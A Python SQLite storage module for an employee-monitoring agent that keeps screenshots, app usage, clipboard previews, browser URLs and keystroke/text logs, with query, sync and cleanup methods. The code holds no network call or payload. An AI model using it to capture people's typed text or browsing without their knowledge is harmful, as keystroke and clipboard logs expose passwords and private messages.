"""
Database Manager
Handles SQLite database operations for storing monitoring data

CHANGES:
- FIX #2: get_statistics(date=None) — accepts an optional date string (YYYY-MM-DD).
          Defaults to UTC today if None. This makes the stats cards respect the
          date picker instead of always showing today's data.
- NEW: browser_activity table + insert/query methods.
- NEW: text_logs table + insert/query methods.
- UPDATED: cleanup_old_data and migrations cover new tables.
"""

import sqlite3
import logging
from pathlib import Path
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Any
import json

logger = logging.getLogger(__name__)


class DatabaseManager:
    def __init__(self):
        self.db_dir = Path.home() / "AppData" / "Local" / "EnterpriseMonitor"
        self.db_dir.mkdir(parents=True, exist_ok=True)
        self.db_path = self.db_dir / "monitoring.db"
        self._initialize_database()

    def _get_connection(self) -> sqlite3.Connection:
        conn = sqlite3.connect(str(self.db_path))
        conn.row_factory = sqlite3.Row
        return conn

    def _initialize_database(self):
        conn = self._get_connection()
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                file_path TEXT NOT NULL,
                active_window TEXT,
                active_app TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                synced INTEGER DEFAULT 0
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS app_activity (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                app_name TEXT NOT NULL,
                window_title TEXT,
                duration_seconds INTEGER DEFAULT 0,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                synced INTEGER DEFAULT 0
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clipboard_events (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                content_type TEXT,
                content_preview TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                synced INTEGER DEFAULT 0
            )
        ''')

        # ── NEW: Browser URL tracking ─────────────────────────────────────────
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS browser_activity (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                browser_name TEXT NOT NULL,
                url TEXT NOT NULL,
                page_title TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # ── NEW: Text / Keystroke logging ─────────────────────────────────────
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS text_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                application TEXT,
                window_title TEXT,
                content TEXT NOT NULL,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        conn.commit()
        conn.close()
        self._run_migrations()
        logger.info("Database initialized successfully")

    def _run_migrations(self):
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("PRAGMA table_info(screenshots)")
            columns = [info[1] for info in cursor.fetchall()]
            if "synced" not in columns:
                cursor.execute("ALTER TABLE screenshots ADD COLUMN synced INTEGER DEFAULT 0")
                cursor.execute("ALTER TABLE app_activity ADD COLUMN synced INTEGER DEFAULT 0")
                conn.commit()
                logger.info("Migration: added synced columns")
        except Exception as e:
            logger.error(f"Migration failed: {e}")
        finally:
            conn.close()

    # ─── INSERTS ─────────────────────────────────────────────────────────────

    def insert_screenshot(self, file_path: str, active_window: str, active_app: str):
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO screenshots (timestamp, file_path, active_window, active_app, synced)
                VALUES (?, ?, ?, ?, 0)
            ''', (datetime.utcnow().isoformat(), file_path, active_window, active_app))
            conn.commit()
        except Exception as e:
            logger.error(f"Failed to insert screenshot: {e}")
            conn.rollback()
        finally:
            conn.close()

    def insert_app_activity(self, app_name: str, window_title: str, duration_seconds: int):
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO app_activity (timestamp, app_name, window_title, duration_seconds, synced)
                VALUES (?, ?, ?, ?, 0)
            ''', (datetime.utcnow().isoformat(), app_name, window_title, duration_seconds))
            conn.commit()
        except Exception as e:
            logger.error(f"Failed to insert app activity: {e}")
            conn.rollback()
        finally:
            conn.close()

    def insert_clipboard_event(self, content_type: str, content_preview: str):
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO clipboard_events (timestamp, content_type, content_preview, synced)
                VALUES (?, ?, ?, 0)
            ''', (datetime.utcnow().isoformat(), content_type, content_preview))
            conn.commit()
        except Exception as e:
            logger.error(f"Failed to insert clipboard event: {e}")
            conn.rollback()
        finally:
            conn.close()

    def insert_browser_activity(self, browser_name: str, url: str, page_title: str):
        """Record a browser URL visit."""
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO browser_activity (timestamp, browser_name, url, page_title)
                VALUES (?, ?, ?, ?)
            ''', (datetime.utcnow().isoformat(), browser_name, url, page_title))
            conn.commit()
        except Exception as e:
            logger.error(f"Failed to insert browser activity: {e}")
            conn.rollback()
        finally:
            conn.close()

    def insert_text_log(self, application: str, window_title: str, content: str):
        """Record a buffered keystroke/text entry."""
        if not content or not content.strip():
            return
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                INSERT INTO text_logs (timestamp, application, window_title, content)
                VALUES (?, ?, ?, ?)
            ''', (datetime.utcnow().isoformat(), application, window_title, content))
            conn.commit()
        except Exception as e:
            logger.error(f"Failed to insert text log: {e}")
            conn.rollback()
        finally:
            conn.close()

    # ─── QUERIES ─────────────────────────────────────────────────────────────

    def get_screenshots(self, limit: int = 20, offset: int = 0) -> List[Dict]:
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                SELECT id, timestamp, file_path, active_window, active_app
                FROM screenshots
                ORDER BY timestamp DESC
                LIMIT ? OFFSET ?
            ''', (limit, offset))
            rows = cursor.fetchall()
            return [
                {
                    "id": row[0],
                    "timestamp": row[1],
                    "file_path": row[2],
                    "active_window": row[3],
                    "active_app": row[4]
                }
                for row in rows
            ]
        except Exception as e:
            logger.error(f"Failed to get screenshots: {e}")
            return []
        finally:
            conn.close()

    def get_app_activity_logs(self, limit: int = 50, offset: int = 0) -> List[Dict]:
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                SELECT id, timestamp, app_name, window_title, duration_seconds
                FROM app_activity
                ORDER BY timestamp DESC
                LIMIT ? OFFSET ?
            ''', (limit, offset))
            rows = cursor.fetchall()
            return [
                {
                    "id": row[0],
                    "timestamp": row[1],
                    "app_name": row[2],
                    "window_title": row[3],
                    "duration_seconds": row[4]
                }
                for row in rows
            ]
        except Exception as e:
            logger.error(f"Failed to get app activity logs: {e}")
            return []
        finally:
            conn.close()

    def get_clipboard_logs(self, limit: int = 50, offset: int = 0) -> List[Dict]:
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                SELECT id, timestamp, content_type, content_preview
                FROM clipboard_events
                ORDER BY timestamp DESC
                LIMIT ? OFFSET ?
            ''', (limit, offset))
            rows = cursor.fetchall()
            return [
                {
                    "id": row[0],
                    "timestamp": row[1],
                    "content_type": row[2],
                    "content_preview": row[3]
                }
                for row in rows
            ]
        except Exception as e:
            logger.error(f"Failed to get clipboard logs: {e}")
            return []
        finally:
            conn.close()

    def get_browser_activity_logs(self, limit: int = 100, offset: int = 0) -> List[Dict]:
        """Return browser URL history, newest first."""
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                SELECT id, timestamp, browser_name, url, page_title
                FROM browser_activity
                ORDER BY timestamp DESC
                LIMIT ? OFFSET ?
            ''', (limit, offset))
            rows = cursor.fetchall()
            return [
                {
                    "id": row[0],
                    "timestamp": row[1],
                    "browser_name": row[2],
                    "url": row[3],
                    "page_title": row[4]
                }
                for row in rows
            ]
        except Exception as e:
            logger.error(f"Failed to get browser activity logs: {e}")
            return []
        finally:
            conn.close()

    def get_text_logs(self, limit: int = 100, offset: int = 0) -> List[Dict]:
        """Return keystroke/text logs, newest first."""
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute('''
                SELECT id, timestamp, application, window_title, content
                FROM text_logs
                ORDER BY timestamp DESC
                LIMIT ? OFFSET ?
            ''', (limit, offset))
            rows = cursor.fetchall()
            return [
                {
                    "id": row[0],
                    "timestamp": row[1],
                    "application": row[2],
                    "window_title": row[3],
                    "content": row[4]
                }
                for row in rows
            ]
        except Exception as e:
            logger.error(f"Failed to get text logs: {e}")
            return []
        finally:
            conn.close()

    # ─── STATISTICS ──────────────────────────────────────────────────────────

    def get_statistics(self, date: Optional[str] = None) -> Dict:
        """
        Return summary stats for a given date (YYYY-MM-DD).
        Defaults to UTC today if date is None.
        """
        if date is None:
            date = datetime.utcnow().strftime("%Y-%m-%d")

        start_ts = f"{date}T00:00:00"
        end_ts = f"{date}T23:59:59"

        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute(
                "SELECT COUNT(*) FROM screenshots WHERE timestamp BETWEEN ? AND ?",
                (start_ts, end_ts)
            )
            screenshots_count = cursor.fetchone()[0]

            cursor.execute(
                "SELECT SUM(duration_seconds) FROM app_activity WHERE timestamp BETWEEN ? AND ?",
                (start_ts, end_ts)
            )
            total_seconds = cursor.fetchone()[0] or 0

            cursor.execute(
                "SELECT COUNT(DISTINCT app_name) FROM app_activity WHERE timestamp BETWEEN ? AND ?",
                (start_ts, end_ts)
            )
            apps_tracked = cursor.fetchone()[0]

            cursor.execute(
                "SELECT COUNT(*) FROM clipboard_events WHERE timestamp BETWEEN ? AND ?",
                (start_ts, end_ts)
            )
            clipboard_events = cursor.fetchone()[0]

            return {
                "screenshots_today": screenshots_count,
                "active_hours_today": round(total_seconds / 3600, 2),
                "apps_tracked": apps_tracked,
                "clipboard_events": clipboard_events
            }
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
            return {
                "screenshots_today": 0,
                "active_hours_today": 0.0,
                "apps_tracked": 0,
                "clipboard_events": 0
            }
        finally:
            conn.close()

    def get_activity_stats(self, start_date: str, end_date: str) -> List[Dict]:
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            start_ts = f"{start_date}T00:00:00"
            end_ts = f"{end_date}T23:59:59"
            cursor.execute('''
                SELECT app_name, SUM(duration_seconds) as total_duration
                FROM app_activity
                WHERE timestamp BETWEEN ? AND ?
                GROUP BY app_name
                ORDER BY total_duration DESC
            ''', (start_ts, end_ts))
            rows = cursor.fetchall()
            return [{"app_name": row[0], "total_seconds": row[1]} for row in rows]
        except Exception as e:
            logger.error(f"Failed to get activity stats: {e}")
            return []
        finally:
            conn.close()

    def get_timeline_data(self, date: str) -> List[Dict]:
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            start_ts = f"{date}T00:00:00"
            end_ts = f"{date}T23:59:59"
            cursor.execute('''
                SELECT timestamp, app_name, window_title, duration_seconds
                FROM app_activity
                WHERE timestamp BETWEEN ? AND ?
                ORDER BY timestamp ASC
            ''', (start_ts, end_ts))
            rows = cursor.fetchall()
            return [
                {
                    "timestamp": row[0],
                    "app_name": row[1],
                    "window_title": row[2],
                    "duration_seconds": row[3]
                }
                for row in rows
            ]
        except Exception as e:
            logger.error(f"Failed to get timeline data: {e}")
            return []
        finally:
            conn.close()

    # ─── SYNC HELPERS ────────────────────────────────────────────────────────

    def get_unsynced_data(self, limit: int = 10) -> Dict:
        conn = self._get_connection()
        cursor = conn.cursor()
        data: Dict = {}
        try:
            cursor.execute('SELECT * FROM screenshots WHERE synced = 0 LIMIT ?', (limit,))
            data["screenshots"] = [dict(row) for row in cursor.fetchall()]

            cursor.execute('SELECT * FROM app_activity WHERE synced = 0 LIMIT ?', (limit,))
            data["app_activity"] = [dict(row) for row in cursor.fetchall()]

            cursor.execute('SELECT * FROM clipboard_events WHERE synced = 0 LIMIT ?', (limit,))
            data["clipboard_events"] = [dict(row) for row in cursor.fetchall()]

            return data
        except Exception as e:
            logger.error(f"Failed to get unsynced data: {e}")
            return data
        finally:
            conn.close()

    def mark_as_synced(self, table: str, ids: List[int]):
        if not ids:
            return
        conn = self._get_connection()
        cursor = conn.cursor()
        try:
            placeholders = ','.join(['?'] * len(ids))
            cursor.execute(
                f"UPDATE {table} SET synced = 1 WHERE id IN ({placeholders})",
                ids
            )
            conn.commit()
        except Exception as e:
            logger.error(f"Failed to mark data as synced: {e}")
            conn.rollback()
        finally:
            conn.close()

    def cleanup_old_data(self, days: int = 7):
        conn = self._get_connection()
        cursor = conn.cursor()
        cutoff = (datetime.utcnow() - timedelta(days=days)).isoformat()
        try:
            cursor.execute("DELETE FROM screenshots WHERE timestamp < ?", (cutoff,))
            cursor.execute("DELETE FROM app_activity WHERE timestamp < ?", (cutoff,))
            cursor.execute("DELETE FROM clipboard_events WHERE timestamp < ?", (cutoff,))
            cursor.execute("DELETE FROM browser_activity WHERE timestamp < ?", (cutoff,))
            cursor.execute("DELETE FROM text_logs WHERE timestamp < ?", (cutoff,))
            conn.commit()
            logger.info(f"Cleanup: removed records older than {days} days")
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")
            conn.rollback()
        finally:
            conn.close()
